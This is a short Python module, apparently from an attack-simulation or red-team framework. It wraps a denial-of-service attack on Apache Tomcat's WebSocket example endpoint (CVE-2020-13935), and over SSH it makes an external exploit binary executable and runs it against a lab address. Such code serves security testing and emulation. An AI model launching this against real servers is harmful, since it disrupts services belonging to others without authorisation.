from attacks import Attack, AttackInfo, AttackOptions


class TomcatDosAttackOptions(AttackOptions):
    url = "Target URL"
    exp = "EXP Location"

    def _set_defaults(self):
        self.url = "ws://172.18.0.2:8080/examples/websocket/echoStreamAnnotation"
        self.exp = "/root/tcdos"


class TomcatDosAttack(Attack):
    info = AttackInfo(
        name="impact_tomcat_dos",
        description="Impact Dos using CVE-2020-13935 Dos vulnerability")
    options_class = TomcatDosAttackOptions

    def run(self):
        self.connect_to_target()
        with self.check_printed("i/o timeout"):
            with self.wrap_ssh_exceptions():
                self.exec_commands_on_shell([
                    f"chmod +x {self.options.exp}",
                    f"{self.options.exp} {self.options.url}"
                ])
